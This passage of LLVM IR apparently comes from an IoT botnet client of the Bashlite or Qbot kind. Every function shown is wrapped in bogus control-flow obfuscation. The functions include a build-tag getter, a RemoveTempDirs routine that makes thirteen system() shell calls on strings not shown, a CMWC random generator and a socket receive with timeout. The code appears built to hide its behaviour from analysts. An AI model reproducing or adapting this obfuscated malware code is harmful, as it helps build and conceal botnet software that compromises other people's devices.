@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  %1 = load i32, i32* @x
  %2 = load i32, i32* @y
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = load i32, i32* @x
  %10 = load i32, i32* @y
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0)

originalBBalteredBB:                              ; preds = %originalBB, %0
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @RemoveTempDirs() #0 {
  %1 = load i32, i32* @x.1
  %2 = load i32, i32* @y.2
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.2, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i32 0, i32 0))
  %12 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.6, i32 0, i32 0))
  %14 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.7, i32 0, i32 0))
  %15 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.8, i32 0, i32 0))
  %16 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.9, i32 0, i32 0))
  %17 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.10, i32 0, i32 0))
  %18 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.11, i32 0, i32 0))
  %19 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.12, i32 0, i32 0))
  %20 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.13, i32 0, i32 0))
  %21 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.14, i32 0, i32 0))
  %22 = load i32, i32* @x.1
  %23 = load i32, i32* @y.2
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %30 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.2, i32 0, i32 0))
  %31 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i32 0, i32 0))
  %32 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i32 0, i32 0))
  %33 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i32 0, i32 0))
  %34 = call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.6, i32 0, i32 0))
  %35 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.7, i32 0, i32 0))
  %36 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.8, i32 0, i32 0))
  %37 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.9, i32 0, i32 0))
  %38 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.10, i32 0, i32 0))
  %39 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.11, i32 0, i32 0))
  %40 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.12, i32 0, i32 0))
  %41 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.13, i32 0, i32 0))
  %42 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.14, i32 0, i32 0))
  br label %originalBB
}

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = load i32, i32* @x.3
  %3 = load i32, i32* @y.4
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  %12 = load i32, i32* %10, align 4
  store i32 %12, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %13 = load i32, i32* %10, align 4
  %14 = add i32 %13, -1640531527
  store i32 %14, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %15 = load i32, i32* %10, align 4
  %16 = add i32 %15, -1640531527
  %17 = add i32 %16, -1640531527
  store i32 %17, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %11, align 4
  %18 = load i32, i32* @x.3
  %19 = load i32, i32* @y.4
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %47, %originalBBpart2
  %27 = load i32, i32* %11, align 4
  %28 = icmp slt i32 %27, 4096
  br i1 %28, label %29, label %50

; <label>:29:                                     ; preds = %26
  %30 = load i32, i32* %11, align 4
  %31 = sub nsw i32 %30, 3
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %32
  %34 = load i32, i32* %33, align 4
  %35 = load i32, i32* %11, align 4
  %36 = sub nsw i32 %35, 2
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %37
  %39 = load i32, i32* %38, align 4
  %40 = xor i32 %34, %39
  %41 = xor i32 %40, -1640531527
  %42 = load i32, i32* %11, align 4
  %43 = xor i32 %41, %42
  %44 = load i32, i32* %11, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %45
  store i32 %43, i32* %46, align 4
  br label %47

; <label>:47:                                     ; preds = %29
  %48 = load i32, i32* %11, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %11, align 4
  br label %26

; <label>:50:                                     ; preds = %26
  %51 = load i32, i32* @x.3
  %52 = load i32, i32* @y.4
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %50
  %59 = load i32, i32* @x.3
  %60 = load i32, i32* @y.4
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart210, label %originalBB8alteredBB

originalBBpart210:                                ; preds = %originalBB8
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %67 = alloca i32, align 4
  %68 = alloca i32, align 4
  store i32 %0, i32* %67, align 4
  %69 = load i32, i32* %67, align 4
  store i32 %69, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %70 = load i32, i32* %67, align 4
  %_ = shl i32 %70, -1640531527
  %_1 = sub i32 %70, -1640531527
  %gen = mul i32 %_1, -1640531527
  %_2 = sub i32 0, %70
  %gen3 = add i32 %_2, -1640531527
  %_4 = sub i32 %70, -1640531527
  %gen5 = mul i32 %_4, -1640531527
  %71 = add i32 %70, -1640531527
  store i32 %71, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %72 = load i32, i32* %67, align 4
  %_6 = sub i32 0, %72
  %gen7 = add i32 %_6, -1640531527
  %73 = add i32 %72, -1640531527
  %74 = add i32 %73, -1640531527
  store i32 %74, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %68, align 4
  br label %originalBB

originalBB8alteredBB:                             ; preds = %originalBB8, %50
  br label %originalBB8
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = load i32, i32* @x.5
  %2 = load i32, i32* @y.6
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i64 18782, i64* %10, align 8
  store i32 -2, i32* %12, align 4
  %13 = load i32, i32* @rand_cmwc.i, align 4
  %14 = add i32 %13, 1
  %15 = and i32 %14, 4095
  store i32 %15, i32* @rand_cmwc.i, align 4
  %16 = load i64, i64* %10, align 8
  %17 = load i32, i32* @rand_cmwc.i, align 4
  %18 = zext i32 %17 to i64
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = mul i64 %16, %21
  %23 = load i32, i32* @c, align 4
  %24 = zext i32 %23 to i64
  %25 = add i64 %22, %24
  store i64 %25, i64* %9, align 8
  %26 = load i64, i64* %9, align 8
  %27 = lshr i64 %26, 32
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* @c, align 4
  %29 = load i64, i64* %9, align 8
  %30 = load i32, i32* @c, align 4
  %31 = zext i32 %30 to i64
  %32 = add i64 %29, %31
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* %11, align 4
  %34 = load i32, i32* %11, align 4
  %35 = load i32, i32* @c, align 4
  %36 = icmp ult i32 %34, %35
  %37 = load i32, i32* @x.5
  %38 = load i32, i32* @y.6
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %66

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = load i32, i32* @x.5
  %47 = load i32, i32* @y.6
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %45
  %54 = load i32, i32* %11, align 4
  %55 = add i32 %54, 1
  store i32 %55, i32* %11, align 4
  %56 = load i32, i32* @c, align 4
  %57 = add i32 %56, 1
  store i32 %57, i32* @c, align 4
  %58 = load i32, i32* @x.5
  %59 = load i32, i32* @y.6
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart241, label %originalBB31alteredBB

originalBBpart241:                                ; preds = %originalBB31
  br label %66

; <label>:66:                                     ; preds = %originalBBpart241, %originalBBpart2
  %67 = load i32, i32* @x.5
  %68 = load i32, i32* @y.6
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %66
  %75 = load i32, i32* %12, align 4
  %76 = load i32, i32* %11, align 4
  %77 = sub i32 %75, %76
  %78 = load i32, i32* @rand_cmwc.i, align 4
  %79 = zext i32 %78 to i64
  %80 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %79
  store i32 %77, i32* %80, align 4
  %81 = load i32, i32* @x.5
  %82 = load i32, i32* @y.6
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart246, label %originalBB43alteredBB

originalBBpart246:                                ; preds = %originalBB43
  ret i32 %77

originalBBalteredBB:                              ; preds = %originalBB, %0
  %89 = alloca i64, align 8
  %90 = alloca i64, align 8
  %91 = alloca i32, align 4
  %92 = alloca i32, align 4
  store i64 18782, i64* %90, align 8
  store i32 -2, i32* %92, align 4
  %93 = load i32, i32* @rand_cmwc.i, align 4
  %_ = sub i32 0, %93
  %gen = add i32 %_, 1
  %_1 = shl i32 %93, 1
  %_2 = shl i32 %93, 1
  %94 = add i32 %93, 1
  %_3 = sub i32 0, %94
  %gen4 = add i32 %_3, 4095
  %_5 = shl i32 %94, 4095
  %_6 = sub i32 %94, 4095
  %gen7 = mul i32 %_6, 4095
  %95 = and i32 %94, 4095
  store i32 %95, i32* @rand_cmwc.i, align 4
  %96 = load i64, i64* %90, align 8
  %97 = load i32, i32* @rand_cmwc.i, align 4
  %98 = zext i32 %97 to i64
  %99 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %98
  %100 = load i32, i32* %99, align 4
  %101 = zext i32 %100 to i64
  %_8 = sub i64 0, %96
  %gen9 = add i64 %_8, %101
  %_10 = sub i64 0, %96
  %gen11 = add i64 %_10, %101
  %_12 = sub i64 0, %96
  %gen13 = add i64 %_12, %101
  %_14 = shl i64 %96, %101
  %102 = mul i64 %96, %101
  %103 = load i32, i32* @c, align 4
  %104 = zext i32 %103 to i64
  %_15 = sub i64 %102, %104
  %gen16 = mul i64 %_15, %104
  %_17 = sub i64 0, %102
  %gen18 = add i64 %_17, %104
  %_19 = shl i64 %102, %104
  %_20 = sub i64 0, %102
  %gen21 = add i64 %_20, %104
  %105 = add i64 %102, %104
  store i64 %105, i64* %89, align 8
  %106 = load i64, i64* %89, align 8
  %_22 = sub i64 %106, 32
  %gen23 = mul i64 %_22, 32
  %107 = lshr i64 %106, 32
  %108 = trunc i64 %107 to i32
  store i32 %108, i32* @c, align 4
  %109 = load i64, i64* %89, align 8
  %110 = load i32, i32* @c, align 4
  %111 = zext i32 %110 to i64
  %_24 = sub i64 0, %109
  %gen25 = add i64 %_24, %111
  %_26 = shl i64 %109, %111
  %_27 = sub i64 0, %109
  %gen28 = add i64 %_27, %111
  %_29 = sub i64 0, %109
  %gen30 = add i64 %_29, %111
  %112 = add i64 %109, %111
  %113 = trunc i64 %112 to i32
  store i32 %113, i32* %91, align 4
  %114 = load i32, i32* %91, align 4
  %115 = load i32, i32* @c, align 4
  %116 = icmp ult i32 %114, %115
  br label %originalBB

originalBB31alteredBB:                            ; preds = %originalBB31, %45
  %117 = load i32, i32* %11, align 4
  %_32 = sub i32 %117, 1
  %gen33 = mul i32 %_32, 1
  %118 = add i32 %117, 1
  store i32 %118, i32* %11, align 4
  %119 = load i32, i32* @c, align 4
  %_34 = shl i32 %119, 1
  %_35 = sub i32 %119, 1
  %gen36 = mul i32 %_35, 1
  %_37 = sub i32 0, %119
  %gen38 = add i32 %_37, 1
  %_39 = shl i32 %119, 1
  %120 = add i32 %119, 1
  store i32 %120, i32* @c, align 4
  br label %originalBB31

originalBB43alteredBB:                            ; preds = %originalBB43, %66
  %121 = load i32, i32* %12, align 4
  %122 = load i32, i32* %11, align 4
  %_44 = shl i32 %121, %122
  %123 = sub i32 %121, %122
  %124 = load i32, i32* @rand_cmwc.i, align 4
  %125 = zext i32 %124 to i64
  %126 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %125
  store i32 %123, i32* %126, align 4
  br label %originalBB43
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %originalBBpart24, %2
  %9 = load i32, i32* @x.7
  %10 = load i32, i32* @y.8
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  %17 = load i8**, i8*** %5, align 8
  %18 = load i32, i32* %6, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %6, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8*, i8** %17, i64 %20
  %22 = load i8*, i8** %21, align 8
  %23 = icmp ne i8* %22, null
  %24 = load i32, i32* @x.7
  %25 = load i32, i32* @y.8
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %23, label %32, label %49

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load i32, i32* @x.7
  %34 = load i32, i32* @y.8
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB2, label %originalBB2alteredBB

originalBB2:                                      ; preds = %originalBB2alteredBB, %32
  %41 = load i32, i32* @x.7
  %42 = load i32, i32* @y.8
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart24, label %originalBB2alteredBB

originalBBpart24:                                 ; preds = %originalBB2
  br label %8

; <label>:49:                                     ; preds = %originalBBpart2
  store i32 0, i32* %7, align 4
  br label %50

; <label>:50:                                     ; preds = %81, %49
  %51 = load i32, i32* @x.7
  %52 = load i32, i32* @y.8
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %50
  %59 = load i32, i32* %7, align 4
  %60 = load i32, i32* %6, align 4
  %61 = icmp slt i32 %59, %60
  %62 = load i32, i32* @x.7
  %63 = load i32, i32* @y.8
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %61, label %70, label %84

; <label>:70:                                     ; preds = %originalBBpart28
  %71 = load i8*, i8** %4, align 8
  %72 = load i8**, i8*** %5, align 8
  %73 = load i32, i32* %7, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i8*, i8** %72, i64 %74
  %76 = load i8*, i8** %75, align 8
  %77 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %71, i8* %76)
  %78 = icmp ne i32 %77, 0
  br i1 %78, label %79, label %80

; <label>:79:                                     ; preds = %70
  store i32 1, i32* %3, align 4
  br label %85

; <label>:80:                                     ; preds = %70
  br label %81

; <label>:81:                                     ; preds = %80
  %82 = load i32, i32* %7, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %7, align 4
  br label %50

; <label>:84:                                     ; preds = %originalBBpart28
  store i32 0, i32* %3, align 4
  br label %85

; <label>:85:                                     ; preds = %84, %79
  %86 = load i32, i32* %3, align 4
  ret i32 %86

originalBBalteredBB:                              ; preds = %originalBB, %8
  %87 = load i8**, i8*** %5, align 8
  %88 = load i32, i32* %6, align 4
  %_ = shl i32 %88, 1
  %_1 = sub i32 %88, 1
  %gen = mul i32 %_1, 1
  %89 = add nsw i32 %88, 1
  store i32 %89, i32* %6, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8*, i8** %87, i64 %90
  %92 = load i8*, i8** %91, align 8
  %93 = icmp ne i8* %92, null
  br label %originalBB

originalBB2alteredBB:                             ; preds = %originalBB2, %32
  br label %originalBB2

originalBB6alteredBB:                             ; preds = %originalBB6, %50
  %94 = load i32, i32* %7, align 4
  %95 = load i32, i32* %6, align 4
  %96 = icmp slt i32 %94, %95
  br label %originalBB6
}

declare i32 @strcasestr(...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = load i32, i32* @x.9
  %6 = load i32, i32* @y.10
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca %struct.fd_set, align 8
  %19 = alloca %struct.timeval, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i32 %0, i32* %14, align 4
  store i32 %1, i32* %15, align 4
  store i8* %2, i8** %16, align 8
  store i32 %3, i32* %17, align 4
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %19, i32 0, i32 0
  store i64 0, i64* %22, align 8
  %23 = load i32, i32* %15, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds %struct.timeval, %struct.timeval* %19, i32 0, i32 1
  store i64 %24, i64* %25, align 8
  %26 = load i32, i32* @x.9
  %27 = load i32, i32* @y.10
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %originalBBpart2
  %35 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %35, i64 0, i64 0
  %37 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %36) #5, !srcloc !1
  %38 = extractvalue { i64, i64* } %37, 0
  %39 = extractvalue { i64, i64* } %37, 1
  %40 = trunc i64 %38 to i32
  store i32 %40, i32* %20, align 4
  %41 = ptrtoint i64* %39 to i64
  %42 = trunc i64 %41 to i32
  store i32 %42, i32* %21, align 4
  br label %43

; <label>:43:                                     ; preds = %34
  %44 = load i32, i32* @x.9
  %45 = load i32, i32* @y.10
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %43
  %52 = load i32, i32* %14, align 4
  %53 = srem i32 %52, 64
  %54 = zext i32 %53 to i64
  %55 = shl i64 1, %54
  %56 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %57 = load i32, i32* %14, align 4
  %58 = sdiv i32 %57, 64
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds [16 x i64], [16 x i64]* %56, i64 0, i64 %59
  %61 = load i64, i64* %60, align 8
  %62 = or i64 %61, %55
  store i64 %62, i64* %60, align 8
  %63 = load i32, i32* %14, align 4
  %64 = add nsw i32 %63, 1
  %65 = call i32 @select(i32 %64, %struct.fd_set* %18, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %19)
  %66 = icmp slt i32 %65, 1
  %67 = load i32, i32* @x.9
  %68 = load i32, i32* @y.10
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart243, label %originalBB1alteredBB

originalBBpart243:                                ; preds = %originalBB1
  br i1 %66, label %75, label %76

; <label>:75:                                     ; preds = %originalBBpart243
  store i32 0, i32* %13, align 4
  br label %83

; <label>:76:                                     ; preds = %originalBBpart243
  %77 = load i32, i32* %14, align 4
  %78 = load i8*, i8** %16, align 8
  %79 = load i32, i32* %17, align 4
  %80 = sext i32 %79 to i64
  %81 = call i64 @recv(i32 %77, i8* %78, i64 %80, i32 0)
  %82 = trunc i64 %81 to i32
  store i32 %82, i32* %13, align 4
  br label %83

; <label>:83:                                     ; preds = %76, %75
  %84 = load i32, i32* @x.9
  %85 = load i32, i32* @y.10
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %83
  %92 = load i32, i32* %13, align 4
  %93 = load i32, i32* @x.9
  %94 = load i32, i32* @y.10
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  ret i32 %92

originalBBalteredBB:                              ; preds = %originalBB, %4
  %101 = alloca i32, align 4
  %102 = alloca i32, align 4
  %103 = alloca i32, align 4
  %104 = alloca i8*, align 8
  %105 = alloca i32, align 4
  %106 = alloca %struct.fd_set, align 8
  %107 = alloca %struct.timeval, align 8
  %108 = alloca i32, align 4
  %109 = alloca i32, align 4
  store i32 %0, i32* %102, align 4
  store i32 %1, i32* %103, align 4
  store i8* %2, i8** %104, align 8
  store i32 %3, i32* %105, align 4
  %110 = getelementptr inbounds %struct.timeval, %struct.timeval* %107, i32 0, i32 0
  store i64 0, i64* %110, align 8
  %111 = load i32, i32* %103, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds %struct.timeval, %struct.timeval* %107, i32 0, i32 1
  store i64 %112, i64* %113, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %43
  %114 = load i32, i32* %14, align 4
  %_ = shl i32 %114, 64
  %_2 = sub i32 %114, 64
  %gen = mul i32 %_2, 64
  %_3 = shl i32 %114, 64
  %_4 = shl i32 %114, 64
  %_5 = sub i32 %114, 64
  %gen6 = mul i32 %_5, 64
  %_7 = sub i32 %114, 64
  %gen8 = mul i32 %_7, 64
  %_9 = sub i32 0, %114
  %gen10 = add i32 %_9, 64
  %115 = srem i32 %114, 64
  %116 = zext i32 %115 to i64
  %_11 = shl i64 1, %116
  %_12 = shl i64 1, %116
